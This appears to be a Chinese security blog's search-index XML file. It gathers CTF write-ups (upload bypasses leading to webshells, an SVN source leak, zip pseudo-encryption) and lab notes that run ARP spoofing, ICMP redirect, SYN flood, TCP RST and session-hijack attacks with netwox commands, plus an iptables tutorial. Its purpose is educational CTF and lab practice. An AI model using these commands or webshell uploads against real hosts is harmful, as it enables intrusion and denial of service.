<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[红帽杯Web-simple_upload]]></title>
    <url>%2F2018%2F05%2F02%2F%E7%BA%A2%E5%B8%BD%E6%9D%AFWeb-simple-upload%2F</url>
    <content type="text"><![CDATA[simple upload这次在你面前的网站的功能非常简单，接受挑战吧！ 0x01 抓包发现admin=0，改为1登录 0x02 文件上传只要把Content-Type 改为image/jpeg就可以绕过 0x03 上传木马测试了php，asp都不行，最后用jsp 在根目录发现flag，下载 Jsp webshell:https://github.com/dingody/jspy 一句话木马和中国菜刀的结合拿webshell 2016年11月整理的最新php免杀一句话木马, 2017php免杀一句话(php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话,php过waf一句话) 整理的最新WebSHell (php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话)]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP]]></title>
    <url>%2F2018%2F05%2F01%2FTCP-IP%2F</url>
    <content type="text"><![CDATA[TCP/IP SEEDUbuntu A号 ip12345678910111213141516171819[03/30/2018 23:42] seed@ubuntu:~$ ifconfigeth0 Link encap:Ethernet HWaddr 00:0c:29:2a:28:90 inet addr:192.168.100.136 Bcast:192.168.100.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fe2a:2890/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:887 errors:0 dropped:0 overruns:0 frame:0 TX packets:634 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:136676 (136.6 KB) TX bytes:74886 (74.8 KB) Interrupt:19 Base address:0x2000 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:60 errors:0 dropped:0 overruns:0 frame:0 TX packets:60 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:5659 (5.6 KB) TX bytes:5659 (5.6 KB) SEEDUbuntu B号 ip12345678910111213141516171819[03/31/2018 01:22] seed@ubuntu:~$ ifconfigeth0 Link encap:Ethernet HWaddr 00:0c:29:79:62:d3 inet addr:192.168.100.137 Bcast:192.168.100.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fe79:62d3/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:361 errors:0 dropped:0 overruns:0 frame:0 TX packets:271 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:84607 (84.6 KB) TX bytes:37560 (37.5 KB) Interrupt:19 Base address:0x2000 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:35 errors:0 dropped:0 overruns:0 frame:0 TX packets:35 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:3397 (3.3 KB) TX bytes:3397 (3.3 KB) Kali Linux ip123456789101112131415161718root@kali:~# ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.100.135 netmask 255.255.255.0 broadcast 192.168.100.255 inet6 fe80::20c:29ff:fe8d:a7b0 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:8d:a7:b0 txqueuelen 1000 (Ethernet) RX packets 65 bytes 4574 (4.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 25 bytes 2319 (2.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 20 bytes 1116 (1.0 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 20 bytes 1116 (1.0 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Task (1) : ARP cache poisoning 实验原理ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。 攻击者向电脑A发送一个伪造的ARP响应，告诉电脑A：电脑B的IP地址192.168.0.2对应的MAC地址是00-aa-00-62-c6-03，电脑A信以为真，将这个对应关系写入自己的ARP缓存表中，以后发送数据时，将本应该发往电脑B的数据发送给了攻击者。同样的，攻击者向电脑B也发送一个伪造的ARP响应，告诉电脑B：电脑A的IP地址192.168.0.1对应的MAC地址是00-aa-00-62-c6-03，电脑B也会将数据发送给攻击者。 netwox 80 –help12345678910111213[03/31/2018 01:16] root@ubuntu:/home/seed# netwox 80 --helpTitle: Periodically send ARP repliesUsage: netwox 80 -e eth -i ip [-d device] [-E eth] [-I ip] [-s uint32]Parameters: -e|--eth eth ethernet address &#123;00:0C:29:2A:28:90&#125; -i|--ip ip IP address &#123;192.168.100.136&#125; -d|--device device device for spoof &#123;Eth0&#125; -E|--eth-dst eth to whom answer &#123;0:8:9:a:b:c&#125; -I|--ip-dst ip to whom answer &#123;5.6.7.8&#125; -s|--sleep uint32 sleep delay in ms &#123;1000&#125; --help2 display full helpExample: netwox 80 -e &quot;00:0C:29:2A:28:90&quot; -i &quot;192.168.100.136&quot;Example: netwox 80 --eth &quot;00:0C:29:2A:28:90&quot; --ip &quot;192.168.100.136&quot; fping -g 192.168.100.1/24 arpspoof 被欺骗主机 https://www.cnblogs.com/rebrust/p/6096101.html Task (2) : ICMP Redirect Attack （1）实验原理ICMP重定向攻击ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让该主机按照黑客的要求来修改路由表。 （2）安装 traceroute1sudo apt-get install traceroute 三台主机都可以traceroute到外网，如traceroute百度的时候，经过的第一个路由器是192.168.100.2 （3）为了让主机A能够正常转发数据包，需要对主机A进行如下设置：1sudo sysctl -w net.ipv4.ip_forward=1 （4）使用netwox86号工具可以完成这个攻击1netwox 86 -f &quot;host 192.168.100.137&quot; -g &quot;192.168.100.136&quot; -i &quot;192.168.100.2&quot; 顺序第一个IP是被攻击者IP，第二个是攻击者IP，第三个是路由器IP （5）然后克隆机再次traceroute，第一次经过的路由是 Task 3 : SYN Flooding Attack 1netstat -na netstat -na 来显示所有连接的端口并用数字表示. https://linux.cn/article-2434-1.html https://blog.csdn.net/thanklife/article/details/55193248 https://blog.csdn.net/yes_angel/article/details/46773073 实验原理TCP SYN泛洪发生在OSI第四层，这种方式利用TCP协议的特性，就是三次握手。攻击者发送TCP SYN，SYN是TCP三次握手中的第一个数据包，而当服务器返回ACK后，该攻击者就不对其进行再确认，那这个TCP连接就处于挂起状态，也就是所谓的半连接状态，服务器收不到再确认的话，还会重复发送ACK给攻击者。这样更加会浪费服务器的资源。攻击者就对服务器发送非常大量的这种TCP连接，由于每一个都没法完成三次握手，所以在服务器上，这些TCP连接会因为挂起状态而消耗CPU和内存，最后服务器可能死机，就无法为正常用户提供服务了。 netwox 76 –help12345678910[03/30/2018 23:47] seed@ubuntu:~$ netwox 76 --helpTitle: SynfloodUsage: netwox 76 -i ip -p port [-s spoofip]Parameters: -i|--dst-ip ip destination IP address &#123;5.6.7.8&#125; -p|--dst-port port destination port number &#123;80&#125; -s|--spoofip spoofip IP spoof initialization type &#123;linkbraw&#125; --help2 display full helpExample: netwox 76 -i &quot;5.6.7.8&quot; -p &quot;80&quot;Example: netwox 76 --dst-ip &quot;5.6.7.8&quot; --dst-port &quot;80&quot; 当输入 netwox 76 命令时，提示错误 1234[03/30/2018 23:50] seed@ubuntu:~$ netwox 76 -i &quot;192.168.100.135&quot; -p &quot;80&quot;Error 3002 : not supported hint: errno = 19 = No such device hint: libnet_init(): UID or EUID of 0 required 这是因为它需要管理员权限，su 123[03/30/2018 23:59] seed@ubuntu:~$ suPassword: [03/30/2018 23:59] root@ubuntu:/home/seed# 这时候可以使用netwox 76 泛洪攻击了 第二次： 关闭SYN Cookie123# sysctl -a | grep cookie (Display the SYN cookie flag)# sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)# sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie) 123456root@kali:~# sysctl -a | grep cookiesysctl: reading key &quot;net.ipv6.conf.all.stable_secret&quot;sysctl: reading key &quot;net.ipv6.conf.default.stable_secret&quot;sysctl: reading key &quot;net.ipv6.conf.eth0.stable_secret&quot;sysctl: reading key &quot;net.ipv6.conf.lo.stable_secret&quot;net.ipv4.tcp_syncookies = 1 Task 4: TCP RST Attacks on telnet and ssh Connections 实验原理TCP头部中有一位被称为”reset flag”，如果接收到该位置为1的TCP报文，则计算机应该立即结束该TCP连接。造成这种攻击的原因与SYN洪泛有类似之处，就是网络层、传输层对于伪造的数据包并没有鉴别能力。 netwox 78 –help123456789[03/31/2018 00:19] root@ubuntu:/home/seed# netwox 78 --helpTitle: Reset every TCP packetUsage: netwox 78 [-d device] [-f filter] [-s spoofip]Parameters: -d|--device device device name &#123;Eth0&#125; -f|--filter filter pcap filter -s|--spoofip spoofip IP spoof initialization type &#123;linkbraw&#125; --help2 display help for advanced parametersExample: netwox 78 （1）建立A号和B号的telnet连接 （2）B号机发现23号端口被占用，建立起了连接 （3）kali主机进行攻击 （4）返回A号机发现连接断开（回车一下） （5）B号机的23号端口不被占用 （6）A号机尝试继续连接，连接不上。注意，此时kali的攻击并没有停止。 （7）SSH进行同样的测试 Task (5) : TCP RST Attacks on Video Streaming Applications. 打开一个视频 发起攻击 A号机已经连接不上视频+ Task (6) : ICMP Blind Connection-Reset and Source-Quench Attacks 实验原理ICMP信息同样可以被用于达成连接重置攻击。为了达到这个目的，攻击者发送一条显示“硬错误”的ICMP的错误信息给TCP连接两端的任意一方。连接将会被立即中断，因为在RFC1122中主机在接收到这样一个TCMP错误包时，应当立即中断相关的连接。RFC1122定义“硬错误”为一个目的不可达且协议无效、端口无效、标志位缺失和DF位设置的ICMP错误信息 ICMP源端关闭信息被拥塞路由器用于告知TCP发送者减缓发送包的速度。攻击者可以制定这样的信息来实施对TCP发送者的拒绝服务攻击。 12345678910root@kali:~# netwox 82 --helpTitle: Sniff and send ICMP4/ICMP6 destination unreachableUsage: netwox 82 [-d device] [-f filter] [-c uint32] [-i ip]Parameters: -d|--device device device name &#123;Eth0&#125; -f|--filter filter pcap filter -c|--code uint32 ICMP code &#123;0&#125; -i|--src-ip ip source IP address &#123;192.168.100.138&#125; --help2 display help for advanced parametersExample: netwox 82 （1）A和B建立telnet连接 （2）kali主机进行攻击 可以发现A收到了攻击，但是无效 出现这种情况的原因可能是在高版本的ubuntu中已经制订了一些策略来防止这些攻击。 Task (7) : TCP Session Hijacking 实验原理TCP会话劫持攻击，是劫持通信双方已建立的TCP会话连接，假冒其中一方的身份与另一方进行进一步通信。通常一些网络服务会建立在TCP会话之后进行应用层的身份认证，客户端在通过身份认证之后，就可以通过TCP会话连接对服务器索取资源。且期间不用再次进行身份认证。而TCP会话劫持为 攻击者提供了一种绕过应用层身份认证的技术途径，因此得到较高水平攻击者的青睐。 （1）安装hunt 1sudo apt-get install hunt (2)A和B建立连接 （2）kali可以监听到A和B的telnet会话 （3）然后运行hunt，却发现hunt发现不了telnet连接，只能用netwox 40 找到最后一个数据包 过程很痛苦，总之都失败了]]></content>
      <tags>
        <tag>TCP,IP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Upload]]></title>
    <url>%2F2018%2F04%2F30%2FUpload%2F</url>
    <content type="text"><![CDATA[第一届“百度杯”信息安全攻防总决赛 线上选拔赛 题目内容：来来来，都是套路，贼简单。 过程 抓包分析一波，看来就是写脚本base64解码响应报头的flag，post上去 12345678910111213141516171819202122232425262728#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/30 22:46# @Author : Lhaihai# @File : fastman.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :第一届“百度杯”信息安全攻防总决赛 线上选拔赛 题目名称：Upload 题目内容：来来来，都是套路，贼简单。"""import base64import requestsurl='http://b495ad3915ae4a38b4c2598b19c1d99ca7f3058e9c154524.game.ichunqiu.com/'session = requests.session()r = session.get(url)temp = str(base64.b64decode(r.headers['flag'])).split(':')flag = temp[1][1:-1]print(flag)flag2 = base64.b64decode(temp[1])print(flag2)datas=&#123; 'ichunqiu':flag2&#125;r = session.post(url,data=datas)print(r.text) 没想到flag要base64解码两次， 拿到path， 访问：题目给的url+path 点Webcome，下滑出现登录表单 又是md5截断 12345678910111213141516171819202122#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/30 23:06# @Author : Lhaihai# @File : md5截断.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :"""import hashlibdef md5(s): return hashlib.md5(str(s).encode('utf-8')).hexdigest()def main(s): for i in range(99999999): if(md5(i)[0:6] == str(s)): print(i) exit(0)if __name__ == '__main__': main('9ea8da') 但是我们还不知道用户名和密码 挂目录扫描器一扫，发现有svn源码泄露， 访问访问 URL+/xxxx/.svn/wc.db (SVN 源码泄露漏洞) 即可获得username is md5(HEL1OW10rDEvery0n3) wc.db是固定的，只能说多多积累经验了 123username：8638d5263ab0d3face193725c23ce095password: 123456captcha : xxx 登录有弹窗 访问 xxxxxx.php 上传个图片，大小写不行，加个空格不行，那就试试1,2,3,4,5，也不行，最后试试pht,phtml 终于成了 后来发现一位大哥的md5截断，随机来，记录一下 1234567891011121314import randomimport stringdef md5(str): import hashlib m = hashlib.md5() m.update(str) return m.hexdigest()while 1: string = '' s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890',4)) if md5(s)[0:6] == 'e63f44': print s break #substr(md5($str), 0, 6) ===]]></content>
      <categories>
        <category>Web安全</category>
        <category>I春秋</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Do you know upload？]]></title>
    <url>%2F2018%2F04%2F30%2FDo%20you%20know%20upload%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[第三届“百越杯”福建省高校网络空间安全大赛 题目内容：加油吧，少年。 过程进来一看，图片上传 顺手上传个菜刀，只要改一改content-type绕过 然后连接，发现config.php，下载。而且有ctf.sql。估计flag在数据库，下载ctf.sql打开，ERROR:// Can Not Read，只能搞数据库了 config.php打开一看 123456789101112&lt;?phperror_reporting(0);session_start();$servername = &quot;localhost&quot;;$username = &quot;ctf&quot;;$password = &quot;ctfctfctf&quot;;$database = &quot;ctf&quot;;// 创建连接$conn = mysql_connect($servername,$username,$password) or die(&quot; connect to mysql error&quot;);mysql_select_db($database);?&gt; 好了密码有了，菜刀连接 执行 1select flag from flag]]></content>
      <categories>
        <category>Web安全</category>
        <category>I春秋</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables]]></title>
    <url>%2F2018%2F04%2F29%2Fiptables%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[参考链接： iptables详解（1）：iptables概念 （必看，看到4就差不多了） iptables查看、开放、删除端口、保存设置 0xFF iptables介绍iptables其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫netfilter。 netfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间。 iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。 netfilter/iptables（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。 0x00 查看规则表12345iptables -t filter -L INPUT --line-numbers //查看filter表的INPUT链中的所有规则，同时显示每天规则的顺序号iptables -t filter -Liptables -t raw -Liptables -t mangle -Liptables -t nat -L 12345678910111213141516iptables -t 表名 -L查看对应表的所有规则，-t选项指定要操作的表，省略&quot;-t 表名&quot;时，默认表示操作filter表，-L表示列出规则，即查看规则。iptables -t 表名 -L 链名查看指定表的指定链中的规则。iptables -t 表名 -v -L查看指定表的所有规则，并且显示更详细的信息（更多字段），-v表示verbose，表示详细的，冗长的，当使用-v选项时，会显示出&quot;计数器&quot;的信息，由于上例中使用的选项都是短选项，所以一般简写为iptables -t 表名 -vLiptables -t 表名 -n -L表示查看表的所有规则，并且在显示规则时，不对规则中的IP或者端口进行名称反解，-n选项表示不解析IP地址。iptables --line-numbers -t 表名 -L表示查看表的所有规则，并且显示规则的序号，--line-numbers选项表示显示规则的序号，注意，此选项为长选项，不能与其他短选项合并，不过此选项可以简写为--line，注意，简写后仍然是两条横杠，仍然是长选项。iptables -t 表名 -v -x -L表示查看表中的所有规则，并且显示更详细的信息(-v选项)，不过，计数器中的信息显示为精确的计数值，而不是显示为经过可读优化的计数值，-x选项表示显示计数器的精确值。实际使用中，为了方便，往往会将短选项进行合并，所以，如果将上述选项都糅合在一起，可以写成如下命令，此处以filter表为例。iptables --line -t filter -nvxL当然，也可以只查看某张表中的某条链，此处以filter表的INPUT链为例iptables --line -t filter -nvxL INPUT 0x02 增加规则windows10 IP地址：192.168.31.129 Kali Linux IP地址： 192.168.100.131 在没有增加规则之前，Kali Linux是可以ping到windows10的 12iptables -t filter -I INPUT -s 192.168.31.129 -j DROP //在INPUT链添加规则iptables -nvL INPUT 再ping一下，ping不通了 但是windows10可以ping 12iptables -A INPUT -s 192.168.31.129 -j ACCEPT //在INPUT链追加规则iptables -nvL INPUT 12iptables -I INPUT -s 192.168.31.129 -j ACCEPT //在INPUT链增加规则iptables -nvL INPUT 这时候ping得了window10主机了 整个ping过程如下 0x03 删除、清空规则删除规则方法一：根据规则的编号去删除规则 1iptables -t filter -D INPUT 3 上例中，使用了-t选项指定了要操作的表（没错，省略-t默认表示操作filter表），使用-D选项表示删除指定链中的某条规则，-D INPUT 3表示删除INPUT链中的第3条规则。 方法二：根据具体的匹配条件与动作删除规则 1iptables -D INPUT -s 192.168.31.129 -j ACCEPT 清空规则删除指定表中某条链中的所有规则的命令，就是”iptables -t 表名 -F 链名” -F选项为flush之意，即冲刷指定的链，即删除指定链中的所有规则，但是注意，此操作相当于删除操作，在没有保存iptables规则的情况下，请慎用。 其实，-F选项不仅仅能清空指定链上的规则，其实它还能清空整个表中所有链上的规则，不指定链名，只指定表名即可删除表中的所有规则，命令如下 1iptables -t 表名 -F 不过再次强调，在没有保存iptables规则时，请勿随便清空链或者表中的规则，除非你明白你在干什么。 1iptables -F 0x04 修改规则修改某条规则中的动作1iptables -t filter -R INPUT 1 -s 192.168.31.129 -j REJECT 注意: -s 选项以及对应的源地址不可省略 修改默认策略 1iptables -t filter -P INPUT DROP 0x05 保存规则在默认的情况下，我们对”防火墙”所做出的修改都是”临时的”，换句话说就是，当重启iptables服务或者重启服务器以后，我们平常添加的规则或者对规则所做出的修改都将消失，为了防止这种情况的发生，我们需要将规则”保存”。 可以使用下面方法手动保存/恢复配置 保存 1iptables-save &gt; /etc/sysconfig/iptables 恢复 1iptables-restore &lt; /etc/sysconfig/iptables 如果想在Kali操作系统启动时iptables设置的规则生效，则需要增加启动项：如下： 12345在/etc/init.d/文件夹下新建iptables文件，如：vim /etc/init.d/iptables，内容如下：#!/bin/bash/sbin/iptables-restore &lt; /etc/iptables/rules.v4 0x06 基本匹配条件总结-s用于匹配报文的源地址,可以同时指定多个源地址，每个IP之间用逗号隔开，也可以指定为一个网段。 1234#示例如下iptables -t filter -I INPUT -s 192.168.1.111,192.168.1.118 -j DROPiptables -t filter -I INPUT -s 192.168.1.0/24 -j ACCEPTiptables -t filter -I INPUT ! -s 192.168.1.0/24 -j ACCEPT -d用于匹配报文的目标地址,可以同时指定多个目标地址，每个IP之间用逗号隔开，也可以指定为一个网段。 1234#示例如下iptables -t filter -I OUTPUT -d 192.168.1.111,192.168.1.118 -j DROPiptables -t filter -I INPUT -d 192.168.1.0/24 -j ACCEPTiptables -t filter -I INPUT ! -d 192.168.1.0/24 -j ACCEPT -p用于匹配报文的协议类型,可以匹配的协议类型tcp、udp、udplite、icmp、esp、ah、sctp等（centos7中还支持icmpv6、mh）。 123#示例如下iptables -t filter -I INPUT -p tcp -s 192.168.1.146 -j ACCEPTiptables -t filter -I INPUT ! -p udp -s 192.168.1.146 -j ACCEPT -i用于匹配报文是从哪个网卡接口流入本机的，由于匹配条件只是用于匹配报文流入的网卡，所以在OUTPUT链与POSTROUTING链中不能使用此选项。 123#示例如下iptables -t filter -I INPUT -p icmp -i eth4 -j DROPiptables -t filter -I INPUT -p icmp ! -i eth4 -j DROP -o用于匹配报文将要从哪个网卡接口流出本机，于匹配条件只是用于匹配报文流出的网卡，所以在INPUT链与PREROUTING链中不能使用此选项。 123#示例如下iptables -t filter -I OUTPUT -p icmp -o eth4 -j DROPiptables -t filter -I OUTPUT -p icmp ! -o eth4 -j DROP tcp扩展模块 常用的扩展匹配条件如下： -p tcp -m tcp --sport用于匹配tcp协议报文的源端口，可以使用冒号指定一个连续的端口范围 -p tcp -m tcp --dport 用于匹配tcp协议报文的目标端口，可以使用冒号指定一个连续的端口范围 123456#示例如下iptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp --sport 22 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 22:25 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport :22 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 80: -j REJECTiptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp ! --sport 22 -j ACCEPT multiport扩展模块 常用的扩展匹配条件如下： -p tcp -m multiport --sports 用于匹配报文的源端口，可以指定离散的多个端口号,端口之间用”逗号”隔开 -p udp -m multiport --dports用于匹配报文的目标端口，可以指定离散的多个端口号，端口之间用”逗号”隔开 123456#示例如下iptables -t filter -I OUTPUT -d 192.168.1.146 -p udp -m multiport --sports 137,138 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport ! --dports 22,80 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 80:88 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80:88 -j REJECT 1iptables -A INPUT -p icmp -j REJECT // 拒绝进入防火墙的所有icmp数据包 1iptables -A FORWARD -s 192.168.1.11 -j REJECT 12iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPTiptables -A INPUT -p tcp --dport 22 -j DROP 0x07 防火墙规则配置和测试在Kali Linux进行配置 1234iptables -A INPUT -p icmp --icmp-type echo-request -j DROPiptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPTiptables -A INPUT -p icmp --icmp-type destination-unreachable -j ACCEPTiptables --line -vnL 思考 Linux主机防火墙处理数据包的顺序是什么？ 顺序处理，如果filter表num1没有处理这个数据包，就接着看num2等等，如果都没有，就采用默认策略 0x08 DOS防御设置syn-cookie关闭 开始攻击 1netwox 76 -i &quot;192.168.100.137&quot; -p &quot;80&quot; 靶机受到洪范攻击，靶机被卡住 配置靶机防火墙规则 12iptables -A INPUT -p tcp --dport 80 -s 192.168.100.131 -j ACCEPTiptables -A INPUT -p tcp --dport 80 -j DROP 再次攻击 可以对防火墙进行如下配置 1234567891011121314151617181920212223242526272829303132333435363738394041iptables –F iptables –X iptables -P INPUT DROP iptables -P OUTPUT ACCEPT iptables -P FORWARD DROP iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT iptables -A OUTPUT -p icmp -j ACCEPT (OUTPUT设置成DROP的话) iptables -A INPUT -p icmp -j ACCEPT (INPUT设置成DROP的话) iptables -A INPUT -i lo -p all -j ACCEPT (如果是INPUT DROP) iptables -A OUTPUT -o lo -p all -j ACCEPT(如果是OUTPUT DROP) iptables -N syn-flood iptables -A INPUT -p tcp --syn -j syn-flood iptables -I syn-flood -p tcp -m limit --limit 3/s --limit-burst 6 -j RETURN iptables -A syn-flood -j REJECT iptables -A INPUT -i eth0 -p tcp --syn -m connlimit --connlimit-above 15 -j DROP iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A INPUT -p tcp --syn -m limit --limit 12/s --limit-burst 24 -j ACCEPT iptables -A FORWARD -p tcp --syn -m limit --limit 1/s -j ACCEPT /etc/rc.d/init.d/iptables save service iptables restart]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客提交百度谷歌收录]]></title>
    <url>%2F2018%2F04%2F28%2F%E5%8D%9A%E5%AE%A2%E6%8F%90%E4%BA%A4%E7%99%BE%E5%BA%A6%E8%B0%B7%E6%AD%8C%E6%94%B6%E5%BD%95%2F</url>
    <content type="text"><![CDATA[留个坑，以后再慢慢写 Hexo+Next主题博客提交百度谷歌收录hexo高阶教程：想让你的博客被更多的人在搜索引擎中搜到吗？ https://hexo.io/docs/deployment.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[啦啦啦WriteUp]]></title>
    <url>%2F2018%2F04%2F28%2F%E5%95%A6%E5%95%A6%E5%95%A6WriteUp%2F</url>
    <content type="text"><![CDATA[解题链接：http://ctf5.shiyanbar.com/misc/LOL/LOL.pcapng hint隐藏在数据包中的秘密 分析用wireshark打开，过滤http，有两个post请求，发现有lol.zip,lol.docs 右键-&gt;追踪流-&gt;TCP 把PK开始的数据复制粘贴到010 Editor，先转为原始数据再复制粘贴，去掉无关的数据 保存为ok.zip 解压需要密码 zip文件用winhex看一下，会发现头上的加密位是未加密的状态，那么肯定就是在文件目录区所修改的伪加密了。 果不其然，在文件目录区修改伪加密位即可解压文件。 参考下面图片 这个题目具体位置如下，四个都要改，就可以解压成功，有四个txt文件 txt文件打开，前面都是89504E47 PNG (png)文件头：89504E47 直接改后缀发现打不开，复制文本的数据，粘贴至Winhex，存储为.png文件 打开发现得到了四个二维码，将其拼接起来 最后一步，扫码得到flag 参考资料：常见文件类型识别 zip伪加密破解方法 zip伪加密 伪加密知识点：一个 ZIP 文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 压缩源文件数据区：50 4B 03 04：这是头文件标记（0x04034b50）14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度00 00：扩展记录长度 压缩源文件目录区：50 4B 01 02：目录中文件文件头标记(0x02014b50)3F 00：压缩使用的 pkware 版本14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度24 00：扩展字段长度00 00：文件注释长度00 00：磁盘开始号00 00：内部文件属性20 00 00 00：外部文件属性00 00 00 00：局部头部偏移量 压缩源文件目录结束标志：50 4B 05 06：目录结束标记00 00：当前磁盘编号00 00：目录区开始磁盘编号01 00：本磁盘上纪录总数01 00：目录区中纪录总数59 00 00 00：目录区尺寸大小3E 00 00 00：目录区对第一张磁盘的偏移量00 00：ZIP 文件注释长度]]></content>
      <categories>
        <category>Misc</category>
        <category>实验吧</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5之守株待兔，你需要找到和系统锁匹配的钥匙]]></title>
    <url>%2F2018%2F04%2F28%2FMD5%E4%B9%8B%E5%AE%88%E6%A0%AA%E5%BE%85%E5%85%94%EF%BC%8C%E4%BD%A0%E9%9C%80%E8%A6%81%E6%89%BE%E5%88%B0%E5%92%8C%E7%B3%BB%E7%BB%9F%E9%94%81%E5%8C%B9%E9%85%8D%E7%9A%84%E9%92%A5%E5%8C%99%2F</url>
    <content type="text"><![CDATA[题目链接:http://ctf5.shiyanbar.com/misc/keys/keys.php?key=d41d8cd98f00b204e9800998ecf8427e hint：12从系统锁下手，通过get方式key字段提交答案，直到您的钥匙与系统锁相等则成功。格式：CTF&#123;&#125; 分析：时间戳md5后生成的密钥 直接上代码 1234567891011121314151617181920import timeimport hashlibimport requestsdef md5(src): md5 = hashlib.md5() md5.update(src) return md5.hexdigest()def getTime(): return str(int(time.time())-2)def getFlag(Unixtime): url='http://ctf5.shiyanbar.com/misc/keys/keys.php?key='+Unixtime r=requests.get(url) print(r.content)for i in range(10): getFlag(getTime()) time.sleep(1) 刚开始都是false 1b&apos;\r\n\r\nfalse&lt;br&gt;\xcf\xb5\xcd\xb3\xb5\xc4\xc3\xdc\xd4\xbf=b5acfe0daa101b0b4c5f2f8bdf834038&lt;br&gt;\xc4\xfa\xb5\xc4\xc3\xdc\xd4\xbf=57ec220296a9d7e1316c086a90185a0b&apos; 这是因为time.time()拿到的时间戳跟实验吧的时间戳有点延迟 